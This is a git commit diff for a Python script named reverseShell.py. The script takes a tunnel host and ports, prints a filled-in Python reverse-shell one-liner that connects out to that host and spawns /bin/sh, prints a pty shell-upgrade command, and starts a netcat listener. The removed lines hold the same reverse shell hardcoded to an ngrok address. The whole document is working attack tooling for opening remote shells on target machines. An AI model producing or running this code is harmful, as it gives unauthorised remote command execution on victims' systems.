887acc18a89f51642f1527c40655dd3a3e220ea1
Capuz Sec <56612613+CapuzSec@users.noreply.github.com>
2019-11-29 20:51:28 -0300

    Update reverseShell.py

--- reverseShell.py
+++ reverseShell.py
@@ -1,5 +1,22 @@
-REVERSE SHELL PYTHON 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",15105));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+#!/usr/bin/dev python 
+# DESENVOLVIDO POR CAPUZ
+# TWITTER: https://twitter.com/CapuzSec
+import sys, os
 
-2.0
-python -c 'import pty; pty.spawn("/bin/bash")'
+banner = 'Ex: reverseShell.py 0.tcp.ngrok.io rport lport'
+
+if len(sys.argv) < 4:
+	print(banner)
+
+else: 
+	ngrok = sys.argv[1]
+	rport = sys.argv[2]
+	lport = sys.argv[3]
+
+comandoNgrok = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ngrok,rport)
+print("\n" + comandoNgrok + "\n")
+
+shellBoa = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+print("\n" + shellBoa + "\n")
+
+os.system("nc -vnlp {}".format(lport))  
